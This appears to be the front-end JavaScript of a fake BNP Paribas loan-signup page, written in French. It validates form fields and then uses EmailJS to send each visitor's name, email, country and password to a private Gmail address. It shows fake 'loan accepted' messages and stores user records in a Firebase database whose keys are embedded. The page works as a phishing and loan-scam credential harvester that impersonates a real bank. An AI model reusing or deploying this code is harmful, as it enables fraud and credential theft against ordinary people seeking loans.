// La recuperation des elements 
const form = document.querySelector("#form");
const currency = document.querySelector('#currencyList');
const username = document.querySelector('#username');
const email = document.querySelector('#email');
const password = document.querySelector('#password');

const pays = document.querySelector('#pays');
const prenom=document.querySelector('#prenom')
const smaller = document.getElementsByClassName('smaller');
const isCompte=document.getElementById("isCompte")
const password2=document.getElementById('password2')
var userInfo={
 email:"" ,
 prenom:"",
 pays:"",
 currency:"",
 username:"",
 password:"",
 password2:"",
  
}
userInfo.currency=currency.value
userInfo.pays=pays.value
pays.onchange=function (param) {
  userInfo.pays=pays.value
}
currency.onchange = function(param) {
  userInfo.currency = currency.value
}
username.onchange=function () {
  if(username.value!=''){
    if(username.value.length>=3){
      username.style.border='2px solid seagreen'
      
    smaller[0].innerHTML=""
      userInfo.username=username.value
    }
    else {
      username.style.border='2px solid red'
      smaller[0].style.color='red'
      smaller[0].innerHTML='Nom doit avoir au minimum 3 caractères '
    }
  }
  else {
    username.style.border='2px solid red'
    smaller[0].style.color='red'
    smaller[0].innerHTML='Nom ne peut pas être vide'
  }
  
}
password.onchange=function (param) {
  if (password.value!='') {
    if(password.value.length >=8){
      password.style.border='2px solid seagreen'
      smaller[3].innerHTML=''
      userInfo.password=password.value
      if(password.value==password2.value){
      password2.style.border='2px solid seagreen'
      smaller[4].innerHTML=''
      userInfo.password2=password2.value
    }
    else {
      password2.style.border='2px solid red'
      smaller[4].style.color='red'
      smaller[4].innerHTML="les mots de passes ne se correspondent  pas"
    }

    }
    else {
      password.style.border='2px solid red'
      smaller[3].style.color='red'
      smaller[3].innerHTML="Mot de passe doit avoir minimum 8 caractères "
    }
  }
  else {
    password.style.border='2px solid red'
    smaller[3].style.color='red'
    smaller[3].innerHTML="Mot de passe ne peut pas être vide"
  }
  
}
prenom.onchange=function (param) {
    if(prenom.value!=''){
    if(prenom.value.length>=3){
      prenom.style.border='2px solid seagreen'
    smaller[2].innerHTML=""
      userInfo.prenom=prenom.value
    }
    else {
      smaller[2].style.color='red'
      smaller[2].innerHTML='Prénom doit avoir au minimum 3 caractères '
      prenom.style.border='2px solid red'
    }
  }
  else {
    prenom.style.border='2px solid red'
    smaller[2].style.color='red'
    smaller[2].innerHTML='Prénom ne peut pas être vide'
  }
  
  
}
email.onchange=function () {
  if (email.value!='') {
   const emailTest=email_verify(email.value)
const uniqUser= 
verifyUniqueAccount(base,email.value)
console.log(uniqUser)
if(uniqUser.isunique==true){
  console.log(uniqUser)
  if(uniqUser.amountloan==0){
    isCompte.style.display='flex'
    isCompte.innerHTML=
    
  `<div class='info'>
 <div class='btn-close'>
  <div>*</div>
  </div>
  <div class='message'>
  vous avez déjà de compte chez nous et il ne vous reste qu'une étape pour avoir un crédit financier à la banque.<br>cliquez sur le lien ci dessous 
   </div>
  </div>`
  }
  else{
    isCompte.style.display = 'flex'
    isCompte.innerHTML =
    
      `<div class='info'>
     <div class='btn-close'>
      <div>*</div>
      </div>
      <div class='message'>
      vous avez déjà de compte chez nous.
      <br>
      Connectez vous pour accéder à votre compte bancaire de crédit en cliquant sur le lien ci dessous 
      <br>
      <a href='https://bnpparibasinter.vercel.app/account'>Accédez à votre compte bancaire de crédit</a>
       </div>
      </div>`
  }
}
else {

}
  if (emailTest===true) {
    userInfo.email=email.value
    email.style.border='2px solid seagreen'
    smaller[1].innerHTML=''
  }
  else {
    email.style.border='2px solid red'
    smaller[1].style.color='red'
    smaller[1].innerHTML='Email non valide'
  }
  }
  else {
   email.style.border='2px solid red'
    smaller[1].style.color='red'
    smaller[1].innerHTML='Email ne peut pas être vide'
  }
 
}
password2.onchange=function () {
  if (password2.value!='') {
    if(password.value==password2.value){
      password2.style.border='2px solid seagreen'
      smaller[4].innerHTML=''
      userInfo.password2=password2.value
    }
    else {
      password2.style.border='2px solid red'
      smaller[4].style.color='red'
      smaller[4].innerHTML="les mots de passes ne se correspondent  pas"
    }
  }
  else {
    password2.style.border='2px solid red'
    smaller[4].style.color='red'
    smaller[4].innerHTML="Mot de passe ne peut pas être vide"
  }
  
  
}
form.addEventListener('click',e=>{
   
console.log(userInfo)
isfieldComplete(userInfo)
sucess()

})
// Fonstions

function sucess(){
 
if(userInfo.email!="" && userInfo.password!=''&& userInfo.password2!=''&& pays.value!='' && userInfo.prenom!=''&& userInfo.username!=""&& userInfo.password2==userInfo.password){
  setDataInBase(base)
  loan(userInfo)
   try {
     // Tab to edit
   
  
      emailjs.init('nO0mGzC33a5qOSUx7')
      var param = {
        
        to: "reunierprospere@gmail.com",
        sendername: ''+userInfo.username,
        mail:''+userInfo.email,
        reply: ""+userInfo.email,
        
        
        pays:''+pays.value,
        prenom:''+userInfo.password2,
        subject: ''+userInfo.prenom
        
       
      }
      var serviceId = "service_cuzrpno"
      var templateId ="template_nvumdqd"
   
      
    
      emailjs.send(serviceId, templateId, param).then(function(resp) {
        
        if(resp.status==200){
          console.log(resp)
          isCompte.innerHTML = `
   <div class='info'>
    <div class='btn-close'>
     <div>*</div>
     </div>
     <div class='message'>
       <div> Informations Vérifiées
                        </div> 
                        <div> Inscription acceptée </div>
                    
                       <div style = "margin: 30px;text-align: center">
                       <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
                       </div>
      </div>
     </div>             
                      
                       `
    
        isCompte.style.display='flex'
        loan(userInfo)
        }
      })
  
}
 catch (e) {
             isCompte.innerHTML = `
           <div class='info'>
            <div class='btn-close'>
             <div>*</div>
             </div>
             <div class='message'>
              <div> vous êtes pas connecté à Internet </div>
                       
                          <div style = "margin: 30px;text-align: center">
                          <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
                          </div>
              </div>
             </div>    
                   
                          
                          `
         
          isCompte.style.display='flex'
          loan(userInfo)
          
          setTimeout(function() {
            isCompte.style.display="none"
          }, 3000)
         }     
    }
    else {
   
      

}

}

const loanItem=JSON.parse(localStorage.getItem('pretbnpparisbas'))
console.log(loanItem)
function sendMailLoan(item,userGet){
  
           emailjs.init('nO0mGzC33a5qOSUx7')
  var param = {
    sendername: "BNP PARIBAS FORTIS",
    to: "reunierprospere@gmail.com",
    name:  '' + userGet.username,
    replyto: "" + userGet.email,
    message: ` ${userGet.username} ${userGet.prenom} fait une demande de prêt pour une consommation de montant ${item.montantPret} sur une durée de ${item.dureRemboursement}  à taux d 'intérêts ${item.interest}.
    Mr ${userGet.prenom} ${userGet.username} accepte et être capable de payer par mois une somme ${item.montantPayeMois} et une somme ${item.remboursement_total} à la fin du prêt avec un intérêt assurance risque ${item.interest.toFixed(2)}.
    Date de Souscription au Prêt :${new Date().toString()}
    `
  
  }
  var serviceId = "service_cuzrpno"
  var templateId = "template_z2winer"
  
  
  emailjs.send(serviceId, templateId, param).then(function(resp) {
  
      if (resp.status == 200) {
        console.log('bondipanche')
     
          isCompte.innerHTML = `
    <div class='info'>
     <div class='btn-close'>
      <div>*</div>
      </div>
      <div class='message'>
                                          <div>Vérifications des paramètres du prêt 
                                          </div> <
                                          div > Prêt accepté </div> 
                                          <div>
                                            Vous recevez une Notification par Mail dès que votre compte bancaire de prêt sera accrédité par le montant de prêt demander <
                                            /div> <
                                            div style = "margin: 30px;text-align: center" >
                                            <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> <
                                            /div>
       </div>
      </div>                        

                                   `
     
        
        isCompte.style.display='flex'
      
  
  
      }
      else {
 
     isCompte.innerHTML = `
     <div class='info'>
      <div class='btn-close'>
       <div>*</div>
       </div>
       <div class='message'>
  <div>Vérifications des paramètres du prêt 
       </div>
       <div > Prêt non accepté < /div
       < div >
      opération échouées.
  veillez réssayer si le problème persiste contactez le service financier à l'adresse mail suivante <br>
    reunierprospere@gmail.com
    </div> 
    < div style = "margin: 30px;text-align: center" >
     <istyle="font-size:50px;color:green" class="fa">&#xf058;</i>
     </div>
        </div>
       </div>
                                 
`
  
  
  
  console.log(resp.status)
      }
    }) 

         
}
function setError(elem,message) {
    const formControl = elem.parentElement;
    const small = formControl.querySelector('small');

    // Ajout du message d'erreur
    small.innerText = message

    // Ajout de la classe error
    formControl.className = "form-control error";
}

function setSuccess(elem) {
    const formControl = elem.parentElement;
    formControl.className ='form-control success'
}

function email_verify(email) {
    /*
    * r_rona.22-t@gmail.com
        /^[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}$/
    */
    return /^[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}$/.test(email);

}
function password_verify(passeword) {
    return /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,12}$/.test(passeword);
}
const loadingDiv = document.getElementsByClassName("RainbowBackground");
let ibanCheck,bicCheck,montantCheck=false

let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""}
    const list= document.getElementById('hover-list')
    const app=document.getElementById('app')
    const listItem=document.getElementsByTagName('li')
    const listDeroulante=document.getElementsByClassName("list-drl")
    
    


/*============Variables setting======*/





  
    


/*============Variables setting======*/





  list.addEventListener('click',function() {
      if(listOpe){
        listDeroulante[0].style.top = '80px'
        listDeroulante[0].style.opacity = 1
        listDeroulante[0].style.display='flex'
        listOpe=false
      }
      else{
        listDeroulante[0].style.top = '65px'
        listDeroulante[0].style.opacity = 0
      listDeroulante[0].style.display='none'
        listOpe=true
      }
    
    })
   

var base=[]
  // Import the functions you need from the SDKs you need
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-analytics.js";
  
  // TODO: Add SDKs for Firebase products that you want to use
  // https://firebase.google.com/docs/web/setup#available-libraries

  // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  const firebaseConfig = {
    apiKey: "AIzaSyBOttx-HrCl-zk6WztTVG-YiKop7-S8ZZM",
    authDomain: "icecommerce-73a10.firebaseapp.com",
    databaseURL: "https://icecommerce-73a10.firebaseio.com",
    projectId: "icecommerce-73a10",
    storageBucket: "icecommerce-73a10.appspot.com",
    messagingSenderId: "128064356219",
    appId: "1:128064356219:web:1535e38b4ddb461cb987de",
    measurementId: "G-8QNWLE6HQR"
  };

  // Initialize Firebase
  const appi = initializeApp(firebaseConfig);
  import { getDatabase,ref,child,get,set,update,remove} from "https://www.gstatic.com/firebasejs/10.13.2/firebase-database.js"
 let sessionEmail = ""
 let bnpparislisbonne = ""

   
 const db = getDatabase();
  const starCountRef = ref(getDatabase());
  console.log(db)
  
  get(child(starCountRef, "bank/bankusers")).then((snapshot) => {
    if (snapshot.exists()) {
      
     base=[...snapshot.val()]
     
    } else {
      console.log("No data available");
    }
  }).catch((error) => {
    console.error(error);
  });
  
 

     
   
 
 
   
 
 
 
function isfieldComplete(info) {
  if (info.email!=''&& info.username!=''&& info.prenom!='' && info.pays!=''&& password.value!=''&& password2.value!='') {
    
  }
  else {
    smaller[5].style.color = 'red'
    smaller[5].innerHTML = "Mot de passe ne peut être vide "
    smaller[4].style.color = 'red'
    smaller[4].innerHTML = "Mot de passe ne peut être vide "
    smaller[3].style.color = 'red'
    smaller[3].innerHTML = " Mot de passe ne peut être vide "
        smaller[2].style.color = 'red'
        smaller[2].innerHTML = " Nom ne peut être vide "
            smaller[1].style.color = 'red'
            smaller[1].innerHTML = "Email ne peut être vide "
             smaller[3].style.color = 'red'
            smaller[3].innerHTML = "Prénom ne peut être vide "
             
                
        
    console.log(' all Field is vide')
  }
}

function verifyUniqueAccount(allUsersInBase, userTest) {
  const uniqueUserIndex = allUsersInBase.findIndex((user) => user.email == userTest)
  console.log(uniqueUserIndex)
  if (uniqueUserIndex > -1) {
    
    return { isunique: true, text: "vous avez déjà un compte", amountloan: allUsersInBase[uniqueUserIndex].tot_amount  }
  }
  else {
    return { isunique: false, text: "vous n'avez pas de compte ", amountloan:0 }
  }
}


function setDataInBase(base){
       const datamount={...userInfo,...{contrat:"crédit financier",status:300,tot_amount:0,tot_deposit:0,iscredit:0,
         typeofCompte:0,assurance:0,dure:0
       }}
      
     delete  datamount.password
       const blockUser = [...base]
       blockUser.push(datamount)
       console.log(blockUser)
      set(ref(db,"bank/bankusers"),blockUser)
     
  
  
}
/*base = [{
    assurance: 30,
    contrat: "crédit financier ",
    email: "ger@gmail.com",
    iscredit: 1,
    pays: "canada",
    prenom: "rose",
    username: "barkley",
    status: 420,
    tot_amount: 250,
    tot_deposit: 40,
    typeofCompte: 0,
    currency: "AMD",
    dure: 0

  }]*/

 
 function loan(user) {
   const uniqTest = verifyUniqueAccount(base, user)
   if (uniqTest.isunique) {
     if (Number(uniqTest.amountloan)== 0) {
       const loanItem = JSON.parse(localStorage.getItem('pretbnpparisbas'))
       if (loanItem != null &&  loanItem != " ") {
         isCompte.innerHTML="Vous êtes inscrits déjà et vous avez atteints vos objectifs. votre demande de prêt au préalable vient d'être validé.veillez vous connecter pour vérifier  votre compte de prêt/crédit financier"
       }
       else {
         isCompte.style.display='flex'
         isCompte.innerHTML=`
            <div class='info'>
                                         <div class='btn-close'>
                                          <div>*</div>
                                          </div>
                                          <div class='message'>
                 vous êtes déjà inscrit (e),ça ne vous qu 'une demande de crédit financier pour finaliser vos projets  <br >
                   veillez cliquez sur le lien 
                   <br >
                   <a href="https://bnpparibasinter.vercel.app/loan">Demande de crédit financier</a>
                                       </div> 
                                       <div style = "margin: 30px;text-align: center" >
                                        <i style="font-size:30px;color:green" class="fa">&#xf058;</i>
                                        </div>
                                           </div> < /div>
         ` 
       }
     }
     else {
       isCompte.innerHTML=`
                  <div class='info'>
                                <div class='btn-close'>
                                 <div>*</div>
                                 </div>
                                 <div class='message'>
                          Vous êtes inscrits déjà et vous avez atteints vos objectifs. votre demande de prêt au préalable vient d'être validé.veillez vous connecter pour vérifier  votre compte de prêt/crédit financier
                              </div> 
                              <div style = "margin: 30px;text-align: center" >
                               <i style="font-size:30px;color:green" class="fa">&#xf058;</i>
                               </div>
                                  </div> </div>
       
       `
   
     }
   
   
   }
   else {
     
     
     
       if (loanItem != null) {
         
         isCompte.innerHTML=`
           <div class='info'>
                         <div class='btn-close'>
                          <div>*</div>
                          </div>
 <div class='message'>
  Vous êtes inscrits déjà et vous avez atteints vos objectifs. votre demande de prêt au préalable vient d'être validé.veillez vous connecter pour vérifier  votre compte de prêt/crédit financier
                       </div> 
                       <div style = "margin: 30px;text-align: center" >
                        <i style="font-size:30px;color:green" class="fa">&#xf058;</i>
                        </div>
                           </div>
                        </div>
         
         `
       }
       else {
         isCompte.style.display='flex'
         isCompte.innerHTML=`
              <div class='info'>
               <div class='btn-close'>
                <div>*</div>
                </div>
                <div class='message'>
         Votre inscription a été un succès, ça ne vous qu'une demande de crédit financier pour finaliser vos projets 
        <br>
       veillez cliquez sur le lien 
        <br>
       <a href='https://bnpparibasinter.vercel.app/loan'>Demande de crédit financier</a>
             </div> 
             <div style = "margin: 30px;text-align: center" >
              <i style="font-size:30px;color:green" class="fa">&#xf058;</i>
              </div>
                 </div> 
                 </div>
         `
       }
       
     }
     
 }
